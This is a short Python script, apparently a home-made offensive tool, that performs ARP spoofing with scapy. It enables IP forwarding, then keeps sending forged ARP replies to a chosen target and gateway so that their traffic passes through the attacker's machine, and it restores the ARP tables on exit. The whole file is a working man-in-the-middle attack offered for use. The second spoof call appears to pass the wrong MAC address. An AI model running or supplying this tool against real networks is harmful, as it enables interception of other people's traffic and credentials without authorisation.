#!/usr/bin/env python3
import scapy.all as scapy
import platform, optparse, time, os

def checkOS():
    if "Linux" in platform.system():
        return True
    else:
        return False

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP, use --help for more info")
    if not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP, use --help for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_mac, target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

def ip_forward(num):
    os.system("echo " + num + " > /proc/sys/net/ipv4/ip_forward")


if __name__ == "__main__":
    ch = checkOS()
    if ch:
        options = get_arguments()
        try:
            ip_forward("1")
            send_packets_count = 0
            print("[i] Exit: press CTRL + C")
            target_mac = get_mac(options.target_ip)
            while True:
                spoof(target_mac, options.target_ip, options.gateway_ip)
                spoof(target_mac, options.gateway_ip, options.target_ip)
                send_packets_count += 2
                print("\r[+] Packets sent: " + str(send_packets_count), end="")
                time.sleep(3)
        except KeyboardInterrupt:
            print("\n[i] Detected CTRL + C...Resetting ARP tables...Please wait!")
            restore(options.target_ip, options.gateway_ip)
            restore(options.gateway_ip, options.target_ip)
            ip_forward("0")
            print("[+] Quitting. Bye")
    else:
        print("[-] Your OS is not linux!")

